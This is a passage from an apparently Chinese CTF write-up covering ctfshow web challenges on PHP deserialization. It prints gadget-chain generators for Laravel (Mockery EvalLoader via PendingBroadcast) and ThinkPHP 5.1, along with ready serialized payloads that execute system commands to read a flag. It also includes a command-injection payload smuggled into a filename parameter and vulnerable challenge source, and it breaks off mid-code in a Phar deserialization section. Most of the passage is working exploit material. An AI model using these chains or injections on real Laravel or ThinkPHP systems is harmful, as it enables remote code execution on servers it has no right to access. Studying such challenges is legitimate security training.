keyword">public</span> <span class="token variable">$connection</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$connection</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">connection</span> <span class="token operator">=</span> <span class="token variable">$connection</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Broadcasting</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PendingBroadcast</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$events</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$event</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$events</span><span class="token punctuation">,</span> <span class="token variable">$event</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">events</span> <span class="token operator">=</span> <span class="token variable">$events</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">event</span> <span class="token operator">=</span> <span class="token variable">$event</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token variable">$line</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">PhpParser<span class="token punctuation">\</span>Node<span class="token punctuation">\</span>Scalar<span class="token punctuation">\</span>MagicConst<span class="token punctuation">\</span>Line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$mockdefinition</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Mockery<span class="token punctuation">\</span>Generator<span class="token punctuation">\</span>MockDefinition</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;?php system('cat /f*');exit;?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$evalloader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Mockery<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>EvalLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dispatcher</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Bus<span class="token punctuation">\</span>Dispatcher</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$evalloader</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'load'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$queuedcommand</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Console<span class="token punctuation">\</span>QueuedCommand</span><span class="token punctuation">(</span><span class="token variable">$mockdefinition</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pendingbroadcast</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Broadcasting<span class="token punctuation">\</span>PendingBroadcast</span><span class="token punctuation">(</span><span class="token variable">$dispatcher</span><span class="token punctuation">,</span><span class="token variable">$queuedcommand</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$pendingbroadcast</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>或者使用phpgcc</p><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token constant">POST</span><span class="token punctuation">:</span> data<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A29<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CSupport<span class="token operator">%</span><span class="token number">5</span>CMessageBag<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>messages<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>format<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A40<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CBroadcasting<span class="token operator">%</span><span class="token number">5</span>CPendingBroadcast<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>events<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A25<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CBus<span class="token operator">%</span><span class="token number">5</span>CDispatcher<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A16<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>queueResolver<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A25<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Mockery<span class="token operator">%</span><span class="token number">5</span>CLoader<span class="token operator">%</span><span class="token number">5</span>CEvalLoader<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">7</span>Di<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>load<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>event<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A38<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CBroadcasting<span class="token operator">%</span><span class="token number">5</span>CBroadcastEvent<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A10<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>connection<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A32<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Mockery<span class="token operator">%</span><span class="token number">5</span>CGenerator<span class="token operator">%</span><span class="token number">5</span>CMockDefinition<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>config<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A35<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Mockery<span class="token operator">%</span><span class="token number">5</span>CGenerator<span class="token operator">%</span><span class="token number">5</span>CMockConfiguration<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>name<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>abcdefg<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A35<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">3</span>Fphp<span class="token operator">%</span><span class="token number">20</span>system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">27</span>cat<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">2</span>Fflag<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>exit<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3</span>F<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D</code></pre><h4 id="web274-Thinkphp5-1反序列化漏洞"><a href="#web274-Thinkphp5-1反序列化漏洞" class="headerlink" title="web274(Thinkphp5.1反序列化漏洞)"></a>web274(Thinkphp5.1反序列化漏洞)</h4><p><a href="https://blog.csdn.net/rfrder/article/details/113843768">Thinkphp5.1 反序列化漏洞复现</a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"lin"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string double-quoted-string">"calc.exe"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"calc"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"lin"</span><span class="token operator">=></span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Request</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span> <span class="token comment">//PHP函数</span>    <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token comment">// 表单ajax伪装变量</span>        <span class="token string single-quoted-string">'var_ajax'</span>         <span class="token operator">=></span> <span class="token string single-quoted-string">'_ajax'</span><span class="token punctuation">,</span>      <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"var_ajax"</span><span class="token operator">=></span><span class="token string single-quoted-string">'lin'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//PHP函数的参数</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"visible"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"isAjax"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Conversion</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">?</span>lin<span class="token operator">=</span>tac <span class="token operator">/</span>flag<span class="token operator">&amp;</span>data<span class="token operator">=</span>TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJsaW4iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJsaW4iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjM6ImxpbiI7fX19fX19</code></pre><h4 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">filter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filecontent</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$evilfile</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$fn</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filecontent</span><span class="token operator">=</span><span class="token variable">$fn</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkevil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/php|\.\./i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filecontent</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'rm '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">filter</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">checkevil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'DOCUMENT_ROOT'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'work done'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'where is flag?'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>没仔细看下面的，看到了<code>__destruct</code>可以调用<code>system</code>所以只需要满足checkevil的正则匹配，执行<code>system</code>即可</p><p>Payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span><span class="token keyword">fn</span><span class="token operator">=</span><span class="token operator">|</span><span class="token class-name">tac</span> fla<span class="token operator">*</span><span class="token constant">POST</span><span class="token punctuation">:</span> flag</code></pre><h4 id="web276-Phar反序列化"><a href="#web276-Phar反序列化" class="headerlink" title="web276(Phar反序列化)"></a>web276(Phar反序列化)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">filter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filecontent</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$evilfile</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$fn</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filecontent</span><span class="token operator">=</span><span class="token variable">$fn</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkevil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/php|\.\./i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filecontent</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">admin</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string 